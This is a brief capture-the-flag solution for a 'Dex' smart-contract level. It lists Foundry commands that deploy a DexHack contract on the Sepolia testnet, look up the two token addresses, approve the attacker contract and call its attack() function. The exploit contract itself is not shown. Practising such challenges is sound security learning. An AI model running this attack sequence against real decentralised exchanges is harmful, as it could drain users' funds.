# Dex Solution

Deploy:

```bash
forge create DexHack --broadcast --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey --constructor-args <instanceAddress>
```

Run to retrieve the `token1Address` and the `token2Address`:

```bash
cast call <instanceAddress> "token1()" --rpc-url $SEPOLIA_RPC_URL
# 0x00000000000000000000000076bc24cf6eee16726f8a87cb7e2ed13968505c8b
cast parse-bytes32-address <token1Address>
# cast parse-bytes32-address 0x00000000000000000000000076bc24cf6eee16726f8a87cb7e2ed13968505c8b
# 0x76BC24cf6EEe16726f8a87cb7E2eD13968505c8B
cast call <instanceAddress> "token2()" --rpc-url $SEPOLIA_RPC_URL
# 0x000000000000000000000000a3ca8b6de0fe71dd24e0e496c6ae98e19fe39020
cast parse-bytes32-address <token2Address>
# cast parse-bytes32-address 0x000000000000000000000000a3ca8b6de0fe71dd24e0e496c6ae98e19fe39020
# 0xa3Ca8b6de0fE71dD24e0E496c6ae98e19fE39020
```

Run:

```bash
cast send <token1Address> "approve(address,uint256)" <dexHackAddress> 100 --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
cast send <token2Address> "approve(address,uint256)" <dexHackAddress> 100 --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
cast send <dexHackAddress> "attack()" --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
